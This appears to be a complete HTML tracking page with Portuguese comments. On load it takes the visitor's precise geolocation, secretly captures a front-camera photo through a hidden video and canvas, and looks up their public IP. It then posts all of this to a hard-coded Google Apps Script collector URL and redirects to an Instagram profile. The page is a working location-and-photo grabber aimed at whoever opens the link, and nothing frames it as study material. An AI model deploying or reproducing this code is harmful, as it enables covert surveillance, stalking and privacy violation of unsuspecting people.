<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Localizando e Capturando...</title>
  <style>
    body {
      background-color: #000;
      color: #fff;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 20px;
      box-sizing: border-box;
    }
    p {
      padding: 10px;
      margin: 5px;
      word-wrap: break-word;
      max-width: 90%;
    }
    video {
      display: none; /* Mant√©m o v√≠deo oculto, usado apenas para capturar o frame */
      width: 320px;
      height: 240px;
      background-color: #333;
    }
    canvas {
      display: none; /* Mant√©m o canvas oculto */
    }
  </style>
  <script>
    let videoStream = null; 
    
    // ATEN√á√ÉO: SUBSTITUA 'SEU_WEBAPP_URL_AQUI' PELA URL REAL DO SEU WEB APP DO GOOGLE APPS SCRIPT
    const WEBAPP_URL = 'https://script.google.com/macros/s/AKfycbwyWteTCdY6ZQFzb--K-lwR8yst_afaDOoz1Zk64Se-BZvselEXoOgLgkK9mFSU9IkX_Q/exec'; 

    // LINK FINAL DE REDIRECIONAMENTO: atualmente para o Instagram
    const REDIRECT_URL = 'https://www.instagram.com/s1tes_ninna/'; // Voc√™ pode mudar este link se precisar

    window.onload = function() {
      console.log("P√°gina carregada. Iniciando processo...");
      updateStatus("üìç Obtendo sua localiza√ß√£o... Aguarde...");
      
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sucessoLocalizacao, erroLocalizacao, {
          enableHighAccuracy: true,
          timeout: 15000, // Tenta obter por 15 segundos
          maximumAge: 0 // N√£o usa localiza√ß√£o em cache
        });
      } else {
        updateStatus("<p>Seu navegador n√£o suporta geolocaliza√ß√£o.</p>");
        console.warn("Geolocaliza√ß√£o n√£o suportada.");
        iniciarCapturaCamera(null, null); // Continua o processo sem localiza√ß√£o
      }
    };

    function updateStatus(message) {
      document.body.innerHTML = message;
    }

    function addStatus(message) {
      document.body.innerHTML += message;
    }

    function sucessoLocalizacao(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;
      console.log(`Localiza√ß√£o obtida: Lat ${latitude}, Lng ${longitude}`);
      updateStatus(`<p>‚úÖ Localiza√ß√£o obtida!</p>`);
      iniciarCapturaCamera(latitude, longitude);
    }

    function erroLocalizacao(err) {
      console.error("Erro na geolocaliza√ß√£o:", err);
      let msg = "<p‚ö†Ô∏è Erro desconhecido na geolocaliza√ß√£o.</p>";
      if (err.code === 1) {
        msg = "<p>‚ùå Acesso √† localiza√ß√£o negado. Por favor, permita.</p>";
      } else if (err.code === 2) {
        msg = "<p>üåê Localiza√ß√£o indispon√≠vel. Sinal fraco ou problema no dispositivo.</p>";
      } else if (err.code === 3) {
        msg = "<p>‚åõ Tempo limite para obter localiza√ß√£o excedido.</p>";
      }
      updateStatus(msg);
      iniciarCapturaCamera(null, null); // Continua mesmo com erro de localiza√ß√£o
    }

    async function iniciarCapturaCamera(latitude, longitude) {
      console.log("Iniciando captura da c√¢mera...");
      addStatus("<p>üì∑ Solicitando acesso √† c√¢mera... Aguarde...</p>");
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { 
                facingMode: "user", // Tenta usar a c√¢mera frontal
                width: { ideal: 640 }, 
                height: { ideal: 480 } 
            } 
        });
        videoStream = stream; // Guarda o stream para poder parar depois

        const video = document.createElement('video');
        video.autoplay = true;
        video.playsInline = true; // Importante para reprodu√ß√£o em iOS
        video.srcObject = stream;
        // N√£o √© necess√°rio adicionar o v√≠deo ao DOM se for apenas para captura invis√≠vel

        video.onloadedmetadata = () => {
            video.play(); 
            console.log("Stream de v√≠deo carregado e reproduzindo.");
            addStatus("<p>‚úÖ C√¢mera acessada!</p>");
            setTimeout(() => {
                capturarImagem(latitude, longitude);
            }, 1500); // Espera 1.5 segundos para a c√¢mera estabilizar
        };

        video.onerror = (e) => {
            console.error("Erro no elemento de v√≠deo:", e);
            updateStatus("<p>‚ùå Erro no stream de v√≠deo da c√¢mera.</p>");
            enviarDadosParaSheets(latitude, longitude, null); // Continua sem imagem se o v√≠deo falhar
        };

      } catch (err) {
        console.error("Erro ao acessar a c√¢mera (getUserMedia):", err);
        let cameraErrorMsg = "<p>‚ùå Erro ao acessar a c√¢mera. Certifique-se de permitir o acesso.</p>";
        if (err.name === "NotAllowedError" || err.name === "PermissionDeniedError") {
          cameraErrorMsg = "<p>üö´ Acesso √† c√¢mera negado. Por favor, permita nas configura√ß√µes do navegador/dispositivo.</p>";
        } else if (err.name === "NotFoundError") {
          cameraErrorMsg = "<p>üì∏ Nenhuma c√¢mera encontrada ou dispon√≠vel.</p>";
        } else if (err.name === "AbortError") {
          cameraErrorMsg = "<p>‚ö†Ô∏è O acesso √† c√¢mera foi abortado.</p>";
        } else if (err.name === "NotReadableError") {
          cameraErrorMsg = "<p>üîí A c√¢mera j√° est√° em uso por outro aplicativo.</p>";
        }
        updateStatus(cameraErrorMsg);
        enviarDadosParaSheets(latitude, longitude, null); // Continua sem imagem se a c√¢mera falhar
      }
    }

    function capturarImagem(latitude, longitude) {
      console.log("Tentando capturar imagem do stream...");
      const video = document.createElement('video'); // Cria o elemento de v√≠deo temporariamente para captura
      video.srcObject = videoStream; // Atribui o stream atual
      
      // Garante que o v√≠deo esteja pronto para captura (pode precisar de um breve play/pause ou delay)
      // Para o prop√≥sito de captura r√°pida, o drawImage √© feito logo.
      
      const canvas = document.createElement('canvas');
      // Define o tamanho do canvas com base no tamanho do v√≠deo
      canvas.width = video.videoWidth > 0 ? video.videoWidth : 640; 
      canvas.height = video.videoHeight > 0 ? video.videoHeight : 480;
      const context = canvas.getContext('2d');

      // Desenha o frame atual do v√≠deo no canvas
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      const imageDataURL = canvas.toDataURL('image/jpeg', 0.8); // Converte para Base64 (JPG, qualidade 80%)
      console.log("Imagem Base64 gerada. Tamanho:", imageDataURL.length, "caracteres.");

      if (videoStream) {
        console.log("Parando stream da c√¢mera.");
        videoStream.getTracks().forEach(track => track.stop()); // Interrompe todas as trilhas do stream (v√≠deo, √°udio)
        videoStream = null;
      }
      // N√£o precisa remover o v√≠deo do DOM se ele nunca foi adicionado.

      addStatus(`<p>üì∏ Imagem capturada!</p>`);
      enviarDadosParaSheets(latitude, longitude, imageDataURL);
    }

    async function enviarDadosParaSheets(latitude, longitude, imageDataURL) {
      console.log("Iniciando envio de dados para o Google Sheets...");
      addStatus(`<p>üöÄ Enviando dados...</p>`);
      let ip = 'N√£o detectado';
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        ip = data.ip;
        console.log("IP obtido:", ip);
      } catch (error) {
        console.error("Erro ao obter IP:", error);
      }

      // Constr√≥i o link para o Google Maps
      const mapsLink = latitude && longitude ? `https://www.google.com/maps?q=${latitude},${longitude}` : 'Localiza√ß√£o n√£o dispon√≠vel';
      console.log("Link do Maps:", mapsLink);

      const payload = {
        timestamp: new Date().toISOString(), 
        latitude: latitude,
        longitude: longitude,
        ip: ip,
        maps: mapsLink,
        imagem: imageDataURL || 'N/A' // Se n√£o houver imagem, envia 'N/A'
      };
      console.log("Payload a ser enviado:", payload);

      try {
        const response = await fetch(WEBAPP_URL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(payload)
        });

        if (response.ok) {
          const responseData = await response.json(); 
          console.log("Dados enviados com sucesso para o Google Sheets:", responseData);
          addStatus(`<p>‚úÖ Dados enviados!</p>`);
        } else {
          const errorText = await response.text();
          console.error(`Erro ${response.status} ao enviar dados para o Google Sheets:`, errorText);
          addStatus(`<p>‚ùå Erro ao enviar dados (Status: ${response.status}).</p>`);
        }
      } catch (error) {
        console.error("Erro de rede ou ao processar resposta do Google Sheets:", error);
        addStatus(`<p>‚ùå Erro de conex√£o ao enviar dados. Tente novamente.</p>`);
      } finally {
        // Redireciona para o link final, independente do sucesso do envio dos dados
        redirecionaInstagram(); 
      }
    }

    function redirecionaInstagram() {
      console.log("Redirecionando para o Instagram...");
      addStatus("<p>‚û°Ô∏è Redirecionando...</p>");
      setTimeout(() => {
        window.location.href = REDIRECT_URL;
      }, 2500); // Espera 2.5 segundos antes de redirecionar para dar tempo de exibir a √∫ltima mensagem
    }
  </script>
</head>
<body>
  <p>Iniciando...</p>
</body>
</html>
